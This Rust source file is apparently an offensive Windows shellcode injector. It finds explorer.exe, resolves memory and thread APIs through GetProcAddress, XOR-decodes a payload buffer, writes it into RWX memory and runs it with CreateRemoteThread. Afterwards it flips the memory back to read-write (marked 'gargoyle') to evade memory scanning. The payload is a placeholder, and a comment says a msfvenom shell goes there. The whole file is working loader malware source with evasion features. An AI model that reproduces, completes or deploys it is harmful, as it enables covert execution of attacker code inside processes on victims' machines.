extern crate winapi;

use std::ptr::null_mut;
use winapi::um::processthreadsapi::{OpenProcess};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{HANDLE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, TH32CS_SNAPPROCESS, PROCESSENTRY32};
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::ctypes::c_void;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::synchapi::WaitForSingleObject;
use std::ffi::CString;

type VirtualAllocExFn = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    usize,
    DWORD,
    DWORD,
) -> *mut c_void;

type VirtualProtectExFn = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    usize,
    DWORD,
    *mut DWORD,
) -> i32;

type WriteProcessMemoryFn = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    *const c_void,
    usize,
    *mut usize,
) -> i32;

type FlushInstructionCacheFn = unsafe extern "system" fn(
    HANDLE,
    *const c_void,
    usize,
) -> i32;

type CreateRemoteThreadFn = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    usize,
    Option<unsafe extern "system" fn(*mut c_void) -> u32>,
    *mut c_void,
    DWORD,
    *mut DWORD,
) -> HANDLE;

fn get_func_pnt(module: &str, func: &str) -> *const () {
    unsafe {
        let module_cstr = CString::new(module).unwrap();
        let func_cstr = CString::new(func).unwrap();
        let module_handle = GetModuleHandleA(module_cstr.as_ptr());
        if module_handle.is_null() {
            return null_mut();
        }
        let func_ptr = GetProcAddress(module_handle, func_cstr.as_ptr());
        if func_ptr.is_null() {
            return null_mut();
        }
        func_ptr as *const ()
    }
}

fn xor_dec(shellcode: &[u8], key: u8) -> Vec<u8> {
    shellcode.iter().map(|&byte| byte ^ key).collect()
}

fn find_expl() -> Option<DWORD> {
    unsafe {
        let snapshot: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == null_mut() {
            return None;
        }

        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == FALSE {
            CloseHandle(snapshot);
            return None;
        }

        loop {
            let exe_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr());
            if exe_name.to_str().unwrap().eq_ignore_ascii_case("explorer.exe") {
                CloseHandle(snapshot);
                return Some(entry.th32ProcessID);
            }

            if Process32Next(snapshot, &mut entry) == FALSE {
                break;
            }
        }

        CloseHandle(snapshot);
        None
    }
}

fn inj_shell(pid: DWORD, shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if process == null_mut() {
            return Err("Handle err".into());
        }

        let alloc_func_ptr = get_func_pnt("kernel32.dll", "VirtualAllocEx");
        if alloc_func_ptr.is_null() {
            CloseHandle(process);
            return Err("VALXfunc err".into());
        }
        let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(alloc_func_ptr);

        let protect_func_ptr = get_func_pnt("kernel32.dll", "VirtualProtectEx");
        if protect_func_ptr.is_null() {
            CloseHandle(process);
            return Err("VPEXfunc err".into());
        }
        let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(protect_func_ptr);

        let write_func_ptr = get_func_pnt("kernel32.dll", "WriteProcessMemory");
        if write_func_ptr.is_null() {
            CloseHandle(process);
            return Err("WPMfunc err".into());
        }
        let write_process_memory: WriteProcessMemoryFn = std::mem::transmute(write_func_ptr);

        let flush_func_ptr = get_func_pnt("kernel32.dll", "FlushInstructionCache");
        if flush_func_ptr.is_null() {
            CloseHandle(process);
            return Err("FICfunc err".into());
        }
        let flush_instruction_cache: FlushInstructionCacheFn = std::mem::transmute(flush_func_ptr);

        let create_thread_func_ptr = get_func_pnt("kernel32.dll", "CreateRemoteThread");
        if create_thread_func_ptr.is_null() {
            CloseHandle(process);
            return Err("CRTfunc err".into());
        }
        let create_remote_thread: CreateRemoteThreadFn = std::mem::transmute(create_thread_func_ptr);

        let alloc = virtual_alloc_ex(process, null_mut(), shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if alloc == null_mut() {
            CloseHandle(process);
            return Err("Alloc Err".into());
        }

        if write_process_memory(process, alloc, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut()) == FALSE {
            CloseHandle(process);
            return Err("Inj Err".into());
        }

        flush_instruction_cache(process, alloc, shellcode.len());

        let thread = create_remote_thread(process, null_mut(), 0, Some(std::mem::transmute(alloc)), null_mut(), 0, null_mut());
        if thread == null_mut() {
            CloseHandle(process);
            return Err("RemThrd err".into());
        }

        let wait_time_ms = 500;
        WaitForSingleObject(thread, wait_time_ms);

        // gargoyle
        let mut old_protect: DWORD = 0;
        if virtual_protect_ex(process, alloc, shellcode.len(), PAGE_READWRITE, &mut old_protect) == FALSE {
            CloseHandle(thread);
            CloseHandle(process);
            return Err("Memprot err".into());
        }

        CloseHandle(thread);
        CloseHandle(process);
    }

    Ok(())
}

fn main() {
    let pid = match find_expl() {
        Some(pid) => pid,
        None => {
            println!("Failed to find explorer.exe process");
            return;
        }
    };

    // msfvenom shell goes here vvv
    let encshell: [u8; 3] = [0xCC, 0xCC, 0xCC];
    let key = 0xe2;  // Replace this with your actual key

    let decshell = xor_dec(&encshell, key);
    match inj_shell(pid, &decshell) {
        Ok(_) => println!("Success."),
        Err(e) => println!("Failed: {}", e),
    }
}
